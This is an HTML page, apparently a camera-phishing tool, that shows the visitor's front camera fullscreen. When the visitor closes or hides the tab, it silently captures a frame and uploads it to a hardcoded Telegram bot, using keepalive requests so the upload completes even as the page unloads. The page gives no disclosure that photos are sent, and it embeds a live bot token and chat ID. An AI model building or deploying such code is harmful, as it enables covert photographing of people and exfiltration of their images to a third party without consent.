<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Fullscreen & Kirim Saat Keluar</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000;
      overflow: hidden;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover; /* fullscreen video */
    }
    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
    const CHAT_ID = "7412613560";

    async function startCamera() {
      try {
        const video = document.getElementById('video');
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        video.play();
      } catch (err) {
        console.error("Kamera tidak bisa diakses:", err);
      }
    }

    async function captureAndSend() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      // set canvas sesuai ukuran video
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      // ambil frame terakhir
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        try {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "foto.jpg");

          // keepalive supaya request tetap jalan saat halaman unload
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData,
            keepalive: true
          });
        } catch (err) {
          console.error("Gagal kirim foto:", err);
        }
      }, 'image/jpeg', 0.9);
    }

    // kirim saat user menutup halaman/tab
    window.addEventListener('beforeunload', captureAndSend);

    // tambahan: kirim juga saat tab tidak terlihat / pindah tab
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') {
        captureAndSend();
      }
    });

    startCamera();
  </script>
</body>
</html>
